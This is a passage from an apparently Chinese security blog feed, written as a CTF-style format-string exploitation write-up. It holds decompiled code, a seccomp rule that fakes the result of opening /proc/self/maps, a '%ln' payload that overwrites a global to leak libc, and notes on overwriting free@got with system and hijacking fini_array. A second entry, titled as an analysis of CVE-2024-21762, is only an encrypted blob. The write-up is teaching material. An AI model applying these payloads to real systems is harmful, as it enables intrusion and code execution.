<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">leak_libc</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// ebp</span></span><br><span class="line">  _BYTE v3[<span class="number">1288</span>]; <span class="comment">// [rsp+0h] [rbp-528h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+508h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="number">0x500</span>uLL);</span><br><span class="line">  v0 = open(<span class="string">&quot;/proc/self/maps&quot;</span>, <span class="number">0x80000</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v0 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v1 = v0;</span><br><span class="line">  read(v0, v3, <span class="number">0x500</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, v3, <span class="number">0x500</span>uLL);</span><br><span class="line">  close(v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-114h] BYREF</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">4</span>]; <span class="comment">// [rsp+8h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-10Ch]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+100h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+108h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input the size&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  global_size = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;invalid size&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    malloc_node = <span class="built_in">calloc</span>(v1, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;input your content: &quot;</span>);</span><br><span class="line">    __read_chk(<span class="number">0LL</span>, (__int64)src, v1, <span class="number">240LL</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(malloc_node, src, v1);</span><br><span class="line">    __fprintf_chk(<span class="built_in">stderr</span>, <span class="number">1LL</span>, src);</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;The random_num+110 is : %d\n&quot;</span>, random_num);</span><br><span class="line">    <span class="keyword">if</span> ( random_num == <span class="number">0x30</span> )</span><br><span class="line">      leak_libc();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>另外 <code>edit</code> 被 patch 过，在函数开头会向栈中 push 全局变量 <code>random_num</code> 的地址，不难想到 <code>random_num</code> 可以被格式化字符串漏洞修改成 0x30 。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400DCC push    offset random_num</span><br><span class="line">.text:0000000000400DD1 nop</span><br><span class="line">.text:0000000000400DD2 nop</span><br><span class="line">.text:0000000000400DD3 nop</span><br><span class="line">.text:0000000000400DD4 nop</span><br><span class="line">.text:0000000000400DD5 nop</span><br></pre></td></tr></table></figure></div>
<p>首先编写一个沙箱规则使得系统调用 <code>open</code> 在打开 <code>/proc/self/maps</code> 时会返回 0 。</p>
<p>我们可以通过 <code>open</code> 的第一个参数最低字节是否为 <code>\x7c</code> 来判断打开的是不是 <code>/proc/self/maps</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-format-string-exploit/images/cc5c5c454619137bd901d09d7eade276.png"
                      alt="在这里插入图片描述"
                ><br>另外注意沙箱规则中的 <code>ERRNO</code> 是系统调用返回的错误码，这个与直接终止进程的 <code>KILL</code> 是不同的。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">A = arch</span><br><span class="line">A == ARCH_X86_64 ? next : dead</span><br><span class="line">A = sys_number</span><br><span class="line">A == close ? dead : next</span><br><span class="line">A == exit_group ? dead : next</span><br><span class="line">A == open ? next : allow</span><br><span class="line">A = args[0]</span><br><span class="line">A &amp;= 0xff</span><br><span class="line">A == 0x7c ? dead : next</span><br><span class="line">allow:</span><br><span class="line">return ALLOW</span><br><span class="line">dead:</span><br><span class="line">return ERRNO(0)</span><br></pre></td></tr></table></figure></div>
<p>利用 <code>seccomp-tools</code> 生成规则。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">➜ seccomp-tools asm rule -a amd64 -f raw | seccomp-tools disasm -   </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x06 0x00 0x00000003  if (A == close) goto 0010</span><br><span class="line"> 0004: 0x15 0x05 0x00 0x000000e7  if (A == exit_group) goto 0010</span><br><span class="line"> 0005: 0x15 0x00 0x03 0x00000002  if (A != open) goto 0009</span><br><span class="line"> 0006: 0x20 0x00 0x00 0x00000010  A = filename # open(filename, flags, mode)</span><br><span class="line"> 0007: 0x54 0x00 0x00 0x000000ff  A &amp;= 0xff</span><br><span class="line"> 0008: 0x15 0x01 0x00 0x0000007c  if (A == 124) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00050000  return ERRNO(0)</span><br></pre></td></tr></table></figure></div>
<p>在调用 <code>__fprintf_chk</code> 时 <code>random_num</code> 位于第 6 个参数，而格式化字符串位于第 2 个参数，因此构造格式化字符串 <code>%16p%16p%16p%ln</code> 可以输出 0x30 个字符且 <code>%ln</code> 恰好对应 <code>random_num</code> 。这样就可以将 <code>random_num</code> 修改为 0x30 实现 libc 基址泄露。另外注意由于沙箱规则使得 <code>open</code> 打开 <code>/proc/self/maps</code> 时会返回 0 ，因此需要在调用 <code>__fprintf_chk</code> 时输入 <code>000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/vm</code> 绕过<code>__fprintf_chk</code> 的检查。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-format-string-exploit/images/34cb11d12a75214c8ad128d7482e4c15.png"
                      alt="在这里插入图片描述"
                ><br>后续按照同样的方法修改 <code>free@got</code> 为 <code>system</code> 函数地址完成 getshell 。</p>
<h2 id="fini-array-不可写绕过"><a href="#fini-array-不可写绕过" class="headerlink" title="fini_array 不可写绕过"></a>fini_array 不可写绕过</h2><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">  <span class="built_in">ElfW</span>(Addr) *array = (<span class="built_in">ElfW</span>(Addr) *) (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / <span class="built_in">sizeof</span> (<span class="built_in">ElfW</span>(Addr)));</span><br><span class="line">  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">    ((<span class="type">fini_t</span>) array[i]) ();</span><br><span class="line">    <span class="comment">//可以劫持</span></span><br><span class="line">    <span class="comment">//先调用array[i],再调用array[i-1]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>调用的汇编代码如下(<code>ubuntu18.04</code>).</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x7ff6e56accff</span> &lt;_dl_fini+<span class="number">447</span>&gt;    <span class="keyword">lea</span>    <span class="built_in">r15</span>, [<span class="built_in">rcx</span> + <span class="built_in">rdx</span>*<span class="number">8</span>]</span><br><span class="line"><span class="comment">;...</span></span><br><span class="line"><span class="number">0x7ff6e56acd10</span> &lt;_dl_fini+<span class="number">464</span>&gt;    <span class="keyword">call</span>   <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">r15</span>]</span><br></pre></td></tr></table></figure>

<p>rdx 固定为 0 ，rcx 来自下面的代码片段。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x7ff6e56accda</span> &lt;_dl_fini+<span class="number">410</span>&gt;    <span class="keyword">mov</span>    <span class="built_in">r15</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span> + <span class="number">8</span>]      &lt;_DYNAMIC+<span class="number">88</span>&gt;</span><br><span class="line"><span class="number">0x7ff6e56accde</span> &lt;_dl_fini+<span class="number">414</span>&gt;    <span class="keyword">mov</span>    <span class="built_in">rax</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">r13</span> + <span class="number">0x120</span>]  &lt;_DYNAMIC+<span class="number">80</span>&gt;</span><br><span class="line"><span class="number">0x7ff6e56acce5</span> &lt;_dl_fini+<span class="number">421</span>&gt;    <span class="keyword">mov</span>    <span class="built_in">rcx</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">r13</span>]</span><br><span class="line"><span class="number">0x7ff6e56acce9</span> &lt;_dl_fini+<span class="number">425</span>&gt;    <span class="keyword">mov</span>    <span class="built_in">rax</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span> + <span class="number">8</span>]</span><br><span class="line"><span class="number">0x7ff6e56acced</span> &lt;_dl_fini+<span class="number">429</span>&gt;    <span class="keyword">add</span>    <span class="built_in">rcx</span>, <span class="built_in">r15</span>                      &lt;__do_global_dtors_aux_fini_array_entry&gt;</span><br></pre></td></tr></table></figure>
<p>r13 的值为一个指针，该指针在 <code>printf</code> 执行的栈上存在，可以控制 <code>[r13]</code> 为 <code>target_ptr - fini_array_addr</code> 从而劫持 <code>fini_array</code> 。</p>
]]></content>
  </entry>
  <entry>
    <title>CVE-2024-21762 分析</title>
    <url>/2024/11/08/CVE-2024-21762/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="49784d9f3774313a0680582db98bab9921281b4f94f16a40351d47f7f2f78733">6485087e6cb098e3002056931866ec1b7eb82d1c9d27fdb677db25863f06d076e508153c1bdf083e8ab988a1ae40367ed7f702aabdd5ffb678655042b6e191c4a34fad415c2097f1490a338730d32a8bd41b138c79ff2d9245a6878cc567f085313539ea1cd00c9fac5db287a6027d0fa29463ba9e01a08d0e289c52bb78a96859449cabbaa36c17075abf9bb2f76e51f5472db3a87f8de69f6300a5d248c30d30adfabc9da8531693fbf3edbd5e9205f112ba4ee8a884a9ef4f4f6410a437ae17ce43a4ab5a4b40107929b2856fe225ce2413d2bb323f8305825af6bd69c460dfdeb226689d2d22fe2211fdcac409385d4c3f4607e82174fd23f30bd048fd40ae3c0b5d76b46e0a99e756c1d71d0eedd6c2f0e78b660b6e376a1813b7cb36e6cdb616817561236dcff29eca24254132df18572bcf58f70eec349bf4227c858633d9bd193b6f5bdb81b210614b4855d80cdb969d9fab31724dc66c151b833b9cc9e73d5496d0908574343ab424f0d5ed38da44dbb1d6f5bd54872736cc652468efc4c1ae60d8d090d05e8a0c0f68d8a8f5d60448cfd56aed879fdfd33adda6a3183d8d43a8912101a5c2df47f5dcf79b27ae63913818e03a55cee8810a9337567152d30cc578a62c8a72fc27fc8de6550bff7ef1c03f59af7e20a6acfe15962c9f91337d0db8790ced07c2b5dae9df3aba2d3497880897ff662270617fa1fd39e1bcf0e0c28730b46b17acf56aecd82807e7d9aa1c78d40a66fe9880dfffba0b972ae8d53a9ac1b0331f8da75344fa91a16cc5cef3eca1e6a49925ca12a150485110b95a9eabe35754fd2c0a2d6fc5dd3a8c8e89c359cc9ade6a2ed202ba18c7e077273dcc86ab00cb6df3b54188f82bf583d56afc075a11cd2bace370646cceaf2dd4457710d9aea63e066f19d391b0fc8dfa3419cb9ae85d6fb481562aca25275491adac6d7e385d1bb68e62bed68945d909481775bd89e3d4d13cd3d4fe1eb8e3c0cd108b5a550495cc81a4d0f65cdc317526fa36882d9a6d3e39141185581bfcfc7415a507c2c2e7ab56a32313558e5da4860ec779fd6dba3256e7be661265d48d00c02510cca85dcc8c0c9aaae9e8ae0f9e539cec8d222a12670fe8a8eeda35358f63650a794a26436654b052961493e775250cb86a35ac3c8c487d4e7b7937a616ff4317bd0243af5530728d9911a7a0e70f62b5d52ad9c3f661bd9ff2c8cc574e7750606edb192380babd4b3d6f89897ccdd14701094dfb7591ec562ef0a0d05860450882e727905a07c559efbe5f924f40013fbf8ae6cb152e2d53561df266bec991e726cbaf744384828669bc8329209621a1004b568238107bf1f18a4c955b0b2811523804a7ac934b583529d3d343adae1a04cfea950a4acb5c57a5b71fd6164dd32fda20897559522638528754161e349bde0cb38a9fa81248b0f1fbca411a05122031fb2a9b4b788124ac8d1f583c25ae502de4dc8601750b0fd67801ddce70830b8439ad783e20be521494a36bdce90694927f68d9ae1ae41a175bf202e895eb24721914a73d442f4323448ddfe06a546a8394e941fd45cb43275dd822bce7d271dc4df756abd3cf50c7227b00d1f26a1ee97042bf5fdc2bdbc7fa33a6bfcbba25a9c1ed44fb72a3a6ba74dde6a38d871fd3768b2f25aaa2def6d4b58b2809ca6ecdf868a5509ec7797431291eca1549f409523aba8c562d81d3368601abaeba96e44bd6ef743567f3f66e92fe49c19f07ab58cef46adcb4811cc8fcd281ec8eb3e31eb1637bc3fcd34fee4d12b1f0d9eaa4d0e4f6b3678e68109045ba61d2d6e9893acd4394ea0a9824fadeb1f234ae1aa43c258cb7d89b3bc062f8dfda82c6458a433ceebdb1ae71e9ce89349944b5929433019c10a9f3d994100dcf27a458ddbad388f7cb08dc4d60d19dbdaeb4823fe591baa18ee01780d332eef555e67bf803deee1437d1babd1e09b33e2fa6b212865c7b167f94690a8e9c508677361b138acdc271ce17aa670a64e57ce0eb057a1d7078efc95d6c64e43cc9951048b8d703c2809861bff569fe565e90f7a74cd18c83e94d6bae881695edc810d936c53810d3e2c3b06d112359807f875a838d07a766ff47fc1c484d2faa04e24593a0fde3ed48a07bc3a9627b3919bc44f58474eff734c5b602ae3de88818dd220554e66fc0b545bf2e758330daa1e72e9dc92d9d494f2192669ea44a791ee4546feb7fa17c9e925ebb281f2244c3950303dbeca96bf0c11489e074e3c6e3a9ce7d17dc419048a534ea0c3d51dc69206b901e019b47cdc304137a6e56bdb8b2ef5e9fe2337b0e7789d0cec5680f2ad3f5323dd03d5903cb6718ff3b171a1eb21ee370ab86791f2fd9e92d243317ea3c18b0647507ed542096ec49a25617f26ed9a09a09bac3e3f39ffcd0ce914b945133afb5dfe39589188f38486d8b3f353e907169223ab294a63fdfcaedd9618b213ed4cc1b45de3272945215b352c75fc6dc59fa7f008744e579d232a24d67f7a257d63e8b89dece9f3b857ded7c5943aba9f8d4784cf7d7eeeb57bba5972cf1b3e45a7ed78a11d1cafcce923de655eed74ed25fad221f851522eee2f78e82b2bf6e2b475a71a4019ea6ebb2b7ebcf97b1ed810642e4c6a6334e1a63277d6e2369a188bbc64773e29aacd2a0f95b69f5ce40586fd8da6c901d32f252898c7a0364204e875cd62288d85cd800854720a853b4ba35ec0b6663cf3ceaa015805e280fb8060c8d3728ac1e51f6c6b1adb0e5bfee66771a95a9f01728402c1e0bf83cd9868462254c6a9764e56c8e9a7d77529c02138cd04b06a45a28825eef4e3c1e9bed4231cca1b8f3113fe56d7c11a52de15c6afb1f9cf2d32be7986c11bd2d0edf9571cb7fb46fd5182f87d5378eb470fdb381b65241f73c756f42a7ef2768a2bcaaf9946c6b9377dc1357cea1adabc4ff391633c0ea776cf38dd16180672e10415e719dec315f941be7f283ff63777899e67aa5a89b7bae9f560e3e763a65068170737f31de53d7eeb751928fb1d9b243c1f3e3082e209669aca08b47bfce51c9dd29e1774936ec7c58eb9eefeba0e88b32a5d5221cebd0817100d4ab9aa3e91c4f541d5d1073cee622ebe321be43ae158a7489a818291a07397e712d3c118e1f9e518446c6087c5640a4642b982653be98a05bda18475730b4decd32e2a5becf90008aee50b3e48702b54a8446f1013b9d144f157bfcc17f01c896f4d9a9ec0e9c8065ece10c3014225de9b117b37152b3aef798c6466a78150ed17ebfa539c7e710d3d1a515b75a33c0f8ad5301ed6934b66edabd4eb55b3da2ed953c57351e8a64fa18fc44e74cb5ee4a3366ae4ef7a42a137564e1868dad0b0cb1d366bdf97d8734a5ee797432883369db7cd679694d722b7e58160a5c4513af57c24fcdaaf8d860d615c2b1886c75256032d2489d45f57c198138446ef8f430cbc15fc919d22c014da23e816ef8c8f64c21332feccd5d490729be93445e9d68175cd5ed6df08b8463c8237c0ffd6ec5eb70390a4757bb619a7d3bfe22b420d7fae24beb0d29154d658dbe8767ea807294d97ed822f73f4a77f2f331edf5a594f442ea5b42f3e63b21cef9eccdd75433b3a8e8ccb25eda9ead0abccdada899a59729e942b1ffe7b97b4796f15d47d99967e0dfeee1da0866dc11feb6ad243e5ddf6e00705c4e9103c5b0c118824c2faebef97e26846b7ff90ce043453d8d17c16bb15491dc798daf6d530dd7e36560b30fa1c0979121dbb20ef5d28bd2f355544a05cd88722fc31d7703857e308c7668bb99a31aeccfffe71ab674caeabc9621833189dabdb30352e2b235a97f508130e507c356eaf3b2a0bfb4281a3a5f44824a8490bfe07486e59131a1e252318a263fce23237aaeff86964a9a3dd62485ec82462f784ff74a7601bb8904c87f439cd0bf3f88cb59388eaadc6c6edf27ecf7d9d598349169813772b9cd4515c5cc8097d3429a3d2ee93669d6d2e85aac1250db1694e795ce6a2842cadfbefe73f48a6572f61d2d8211dbbbba4232be18684dc0b492faa4b5da1d695d04a1df621c88bf29eccf2d5e9add7ada9c6703b0dea51a9a81506941b7d029e67f53a06f9290f30ea45f18788c4d9f3d5e2f01896605fdb88bf36efad462fc8d07b869f062120fdd209140b59b7c6e67f3bc1091880e68a415d25fb876ba6c1be0be70ccf094de65f466e31c051abb7e34ab026d8bcb3f9908edec332478926e34438e724ba87bf9549f9ea251f93632a4d1f555d484e517886f2dfcfd43af62df749d400a9a2ac3668ec7b526fd0afb02f0823f25bfffa2d8dd7a2661d29b8491fb3e96e315979f7c682b71563eae1f1286d2b142299cea9dd7216b39b4c97bad80979833d768e1a8d95f35d6c747d2f3f3178e63f10ecafabd76b4ef6f3ef62f7e189a746af9d3f7f601ea5afa61f73158212d6772b5a071946c47dbc8949a6e930829a65fa464f0a360fed11d79eed0041206f4cb51c6236713a3d04c446af2e57499c109464a0fd182d6fec9117202343cd2c8d6a9b0ae8bd155cbd630bcd94a1513a37813277849be87a20eb555d3e7884f51da48684a7437b6367021e0bc3601cf1e9c14bf0c959090383086ea89c56811ebbc6c4d87e49cd522973ec121c8046188e3cd12c5a938c51c273c30a3b01f25a2964d4ef76058c785fc56738b3b6e57c3a2c635ea61dca041ca29fd375c7eb22467424271da1b3f1ff9878e4a577724faf7fac9fe31b6d6f53395f0c5a3b48d4371e7d69ea5e37144a7862d305e9d9f5d566a95a2e990c554cd72f98bcd714617085e5a0e703927bce7b16d35ee5e4441be281f174188beb70ec157ee472217d37123fce0b53efc0b380010ee79e67ef03e62a8111497c717ddbbaaf41550896e50dc027118ba1f56ea39613dc209a98e5a7eb246eb9f0ba673ef179501096ddc101c24361c825e66c303744c733e5586314e0631cafcaf0d37b024f63fab9058280d5a9f47f9da0a7ce48bc459da6cfb31d9a43351df359f23dbb51bd55ba28b8b69f2322138548d89319e82d7844187be642668570add06dc1746c6b059a13a356e9a104c194b6f0e9ec01ecbdec006e02c7763ce7a69b1d2cc2f2f3b66681dfc49993d8d9ed379368b915ad5b96c003a44617f3fa535588891d8366d9ff81707e07f6d98b219b8f5228fc2ac4ec59092a0ce6be993f3fb526b9eeb1cc0f99de8274361e9a36c39642fd97adf6c603aa537f8ae68d27d9161947c63c1c4a947a7c6f1bfa6d959fe27dc2b6f5ce1fc021ab9701c3423afebbea08999393da1527ea02b5acc4a3b0ade89aea7fe86d55c4c74ae07b5094935c633b0349f0ce1e1d169874b063736a6c88669df5e412c35b815e8f182e6c6363c9883c3cac7cf879c123fbb5dd00622b7e6344ffc632f3fa3372e79397b219293fa02c06d942b9704de606555d4591cf02ef391df0de59c5eca078907bfb5b6bce819c17b7cfb4ad10991266a4f59614ab95299a29a63990da43d6f4a18d36a8834816b92c41a81cc1635534d8f70eb248cb952667b9ac501ca780e711686f2c973ac34569364d9fb2869f1da94b8106ef5722bb113fad89007b6d6a3965b8df5c3ca83bbf6826b195a8976212a8c6705e4c50117cc1d6f16a4e8d4598cbe93b2bbd64acdd36fe6033591631f7d7f7ed6ca5d4448438ff0d6466db82e1db116f6cce231d748aede9303b7f8a97db0cfe51c8d04dd201c574a791e5e36952e810993d5ef27fdc3c029f07f1a80da2b73c55c78578fc0f903be465cd695115fc9b5e2b266227725a08a3340b886aa1c0d20ed6672a3a05151daaa6319e2a045ce231b0edf95f227a1337645d181f56e56aa4a7fadb3608733335cf2f3fb6a4119576a565b6563a0c0eb869e326cba4250e8a91ca67c5d476a49dab1a25315039ca06ff8da2cc8d4d00ede3553f2b6f2209feaf14e9807e86a0d97baf9962b56fca9b9151f8a27573db56e6f43c3dfd80b0ac349086cb705e6b8b02164ef55086d00d9a97847693b7c0560f6ae39e7a3157d616d687bb648a68c5a70ba60dcec762cb7a16d9e0d77ada624e0aafbdde9268773031f9c0830998212fa5bcbe1946099c223c35f326fae7238a0c14ff0f982dc564b2162cf5f361763d81e4b6524588412f91e53baec1fb329f4cd1b7a5126e5ff1ec3fdb13c4210be55c73970d9362aebecb3d55a3a3101c8c72af10e107761a9c99bda2cffb1a2081c8e7a434e93faad70cf12e7f0300f6185cda9158492337d8065852a991b834fb15ced8f0e365a2983bb3efd7ee06faddbc7181b7c974a13b9d100124b9739fad2516c29344b41d712f82473fb44f55490e37e2e96422e952d86c54181cf8e318571b9f95e349770222fe22325ccf024ccef7e04ed23bb8223fe1b9769c6c4cba838cfd008afa615132c36cf6bac64a88b3f6f2bbdc814cb5a478ab6368a5e8fa78f893a955c0ddab835ee0b04e8a0ed4bc3f2664170f002fa813b98f438554c4d6bff288b1c13bd8182aafbb3d5a9576ed67fb02dc0df14e897fdfc15ad215e0ec1f5d18910f81f485fa6c7fd4b5a6047087856d6af35a23b75acd360ac3a793a8f37b69c9eb6482be4febdb638afbb1e9c5e4741a9ffebfa604b636b31be40be597b51d3c202fa450117aa6e4d6c83de84ce4a3e5e02e333e75bbe49a213908dc1d59e01959a1c0b2ed21acb487e64513efc570e4009309cb03dcddbba83eaf4e52de86b59f6f7ec84f170a3eca705245ef62dbe0ca7bb9a9592df517af53ddf1dd5b1643efcf68796f3f63e091cdcda2ec7adb1b5d89046d6e91715dcaa10e0851e0417b1ac40cee72b652c4346489fcd5256779dc8e2d61333760c983938d42a4d75d85b34935b4930536fc4b026dba85236887416ca33fbff527d9aca5021aa64ec7864f77daf8f19cb3bf6c0004e9c522720ccf671bcedbd839033a33da6998b2308212d669527586c86faffb7b62578f821e89d2019d5fb188db6d534668637ee64660555c0e154e1822a38f9a91b116e8966aa1010f2adcccf5c0b114502853f820356797d8cc69515925b0732cf1053814556994d7eaa52eb6629826f6270cceb3568249e45932c0c768b40b73ed36791beaa63badb79bd81a714b5b45863bacef5188f77bc36def27fb8aeab3f850fc90ea885d22833d8cfa385014632f903acdb7179d7076f42cbeca129c5ff59865211757202f9e4359c785e0a986a32ebfad833510fda45909f2fe1e27b8d881285b4d3b3b28726db472795162eca9d1fce147ad7946f3c14e059b466bac23d60277b2f6ffb9bad325c816225e3b784da257ee413dd3f757a9494a15945affeb43440af5e534cef6b6eb1454a06fc3774ae36bcd0225ea62648f084e014e41a7b98b42773104e46aaed519aca5866dae1176d3d43df46860408e9096aaacdd12ce91e265101092364e67209e45c408c5fcb4d5d03074c170a3439b72e3f5a2ab9d67dba826bb5e837b1ab9062956fb1f38f777b18ddc35ed1f40c6a32992b3b54243202330bac47d937e2f0c1cc06747a259b7482a5f97e95361f3b1106f742a13f4ce27e34ccef50ff9798289bbb726995b479a97fcca2d75b237d9b9fcd500ef24afee15d790703f1830b6e3b3976399f928d949dee20938e37163e18efcf186a371fa3346f31094ca41e57f6e2d649944506033495789e38b8a9c6b8d3a63dc8164a27004d50b1ca4e333f8f7ae3c8b5b4871f42253acfd092961d3eb70fd419dc8969d799b8b23dad5b038519b623e994ee2bf8d2c66ea533f2e821a4cebf504050ce4f8698b7eb70d09732e2e1017a99667953a7867a542412de76f05854e4e72d72d8a5b2311956994f2fb591d357b58c65046d2458f2fb55d9370fb74242351aae7b09730f6a271db5534a29578e4e0074b75a0e5ee95a7e365f78a0f73aa0546644feb2d2f796545b16ddabeadbd6e009652585792c5f494ac78a853ebc4d50485f129a34bfd6ecab93e1ecfc8be4c8cbc804ab390744662f4f85eab3d7fa8708a3709e7d6b97feac4dd5b08e99f7354319545cac21a072f0fa031ccd0ad218d15f32788f3ca0e5db2b06bada2a2462b81e09edd8d38d23dedeb11d05fc858a46a7d95782376b93fbaada5f4a1304741665138c18f0d0c16063f50a325e7a148c711062e94e37524a4019580660d3880a3af6e4b93d0a9c149f271280eb36b158b46ae44f13a26323e87ccbb78cf41faa6068cdbc9a2882404dd5733ebc0258aa65529a3427d59b3d07e1e9f5e317a279f0485532b1352edf7218edd71390fea99d3e3cf2ed3fd43bbab122c7968c507e73b437e8c539aeca1ceb984da5ff14c194b4e0f9029b6e37c7c6d0a79140c52dd7cd4072ce7cbd9786b3da56c67010fe6fd06a182271d76befed2bd80da3830db7b7747e6de959a891defa1b8ae1cc3fc75bf81d93b1b833c278e9481815e38cd7922866b4c3048230a5fc50089d195d442719ee96952f6cbe94bf7b52a18e53792c225c074adfb582eb2b0c36beed9dd5db3e7a7a6523b17f922321b824285f8c1d0552421cbbe221847eac7eca6717208e4a2bb76b8e31ba4d8a6858de959639aad43318e6a7ab6d90b43a64bd943619a5318e4b3374ac6502d3082db111d7f32ef1af917111befd22475646f7671fcf7fb5c01897246d6e702c5eafc7d628c1122e9eabc7a696ab6d687c872ec65297643e86c6a9198fff9d477d3728e88a446fea7ce41f9b10f0483bdad71442c35088cbfaca747f5202269e17e9cedd1e7b807de22f06d6f8b828ed45b62254c815e96b69e87c02b912d1939fc35578177802bc0b47fc8a638ff64bb1598e486b4cfbd2d6d9b7e1aafee2722f929dc9f38d0959d7af5338502e562cf96581386b01dab28448ea51b5292301121640fe6eb3ef0f0230c6fd1ecab913d3e0e82aeb04cf6878a3f2c5e0e7951eb6c15a5e9c225051e9d8fab6bc1db4b9b6b5c57e33fb670151bf16856d07dc972ee311285cdb0b86f760b05eae37fac6f93515678649f73b72a9952cae4e2eb1175e884f56374d34eb69e285945904e6c5b9b547429abcae77e941a2f0ca3cc418115833d73fcc9d1af74371fd9272de498986761252a91cd37a73ef56c199360fe528205adf867ee0e8fd96da35694db91cd97fbdbe6d4c0b8dbf17afd8b273ba94b4978f2f91312bc8c0d73c052196d7ffdb2a43957554165edc552521cc9b1481eed3d1d8a60cb5cc2f284ae46c1d52f749b116791219564f1615972709e7ce0bac44567c5bfd5015990307311a732e3655bb968e11a53394e8bbe68e51a95086e2240d101191a6a73851a57b2a7f4c54419a16ce35ad4772964c97e3def45dfaa0043031e33c7af6d1d24049f6ff41d556e5cf0839f3473d0bce42bd054111152dfa4827e65de8a01467db826dd5f5047bdfabae3a1915fff4027fa0dde0ec5354d38ea80e4a908ff346cbd9a1ac66c78f97f6ea145b4a611f17f568525c8921e8450d9bb5841e73ace1802b5ba22e68bab2483d73d8cdc5a655acb06f80ce27f0657fde20ccdbcb91c68a92c78a4e188f644cd24c70d2a072ba4be72300deefe666a90df77bbc7b073b8260b99dd5149670b1d61d16c67dc524e36b860a1c0cda36d6e982d78e8fb031dd30f63aaadb2a9cda7f8beba198a1e8154101ce8058e83b673241468dec98bdf154813f444f4b3ea428e268b5ad64069ea216bfe2535678c58a23646c50b5905d5489a32807b998f481abfa7eb1d730738bd61f85f08aff3189cbc57f85d1abd05c15facb70ec4c32e3551ab24697362e5e02f0f759cc90fa3914b2b1aa6c7e0032